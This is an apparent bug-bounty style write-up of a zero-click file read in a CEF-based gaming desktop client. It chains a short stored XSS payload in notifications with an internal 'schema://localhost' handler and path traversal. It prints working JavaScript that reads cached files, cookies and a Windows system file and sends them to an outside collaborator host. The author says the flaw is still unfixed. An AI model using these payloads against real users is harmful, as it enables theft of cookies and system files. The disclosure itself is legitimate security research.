# How did I break out of the sandbox using built-in feature

One day I decided to test a famous gaming company’s desktop client (Sadly they haven’t fixed it yet :( ), and I ended up finding a 0Click System File Read

## About the target:

It is a desktop client using Chromium Embedded Framework https://github.com/chromiumembedded/cef for rendering all the HTML/JS files, and it is used to help users (Gamers) install their games and track progress on each game.

## Chat feature and useless XSS in notification:

While spraying payloads around the desktop client, I stumbled on a stored XSS that gets rendered on the notification pop-up.

Briefly, this XSS wasn’t that useful because the client is storing cookies on files and the there’s a limitation on the vulnerable input (30 characters) payload like this would work `<script src=https://lol5.xyz/>`

## Failed attempt finding 1Days on CEF library:

After reading every page on the library’s wiki 

[cef /](https://bitbucket.org/chromiumembedded/cef/wiki/browse/)

and trying some of CVE’s  POCs in order to achieve code execution or DOS, all attempts finished with frustration and failure.

And the most frustrating part is the framework’s javascript API is so sandboxed and limited that I can’t call for example`file://` from object and iframe tags.

## PAK files for the truth:

After a day I went back and tried to analyze the client and its features, while exploring some of the client file, I noticed some`.PAK` files, for those who can’t get what is happening  from my experience with pentesting thick clients, usually PAK files are used to store static files that could be rendered on the application.

Extracted the files and read some of HTML files and js files, here something caught my attention which was code that looked like this:

```html
<style>
  @import url("schema://localhost/cache/sytle.css") ;
</style>
```

## How static files are server to the client:

From my understanding of the pak files and how the client is functioning and visualized the flow with this modest design 😑.

![g](https://i.ibb.co/ZBdxxFy/uply.png)
the question here is how I used this to my advantage?

When I saw this I had a theory of using the schema to retrieve the cookies from client’s files.

I made a POC that looks like this :

```jsx
Promise.all(   fetch('schema://localhost/cache/style.css').then(x => x.text())  ).then((sampleResp) => {   document.location='http://3w0v6pygzk4cbjxec4qdnlja41avyk.oastify.com/?payload='+sampleResp;  });
```

Then went to the vulnerable input and put my payload `<script src=https://[lol5.xyz](http://lol5.xyz)/>`  where lol5.xyz is a local domain where I’m hosting the POC, and I was able to retrieve the css file.

after this, I went for the cookies and I got success.

But I didn’t stop here, I remembered that the client asks for admin privileges when opening it.

then I tried to traverse back to the system files, I made a POC :

```jsx
Promise.all(   fetch('schema://localhost/cache/../../../../../Windows/LogAdmins.txt').then(x => x.text())  ).then((sampleResp) => {   document.location='http://3w0v6pygzk4cbjxec4qdnlja41avyk.oastify.com/?payload='+sampleResp;  });
```

Since my computer is linked to an AD that’s why I aimed for the `LogAdmins.txt` , finally I was able to retrieve LogAdmins.txt file. 

![loool.png](https://i.ibb.co/vqMr2H7/loool.png)

funny thing is that XSS requires no user interaction and I can execute it on any user using this desktop client.
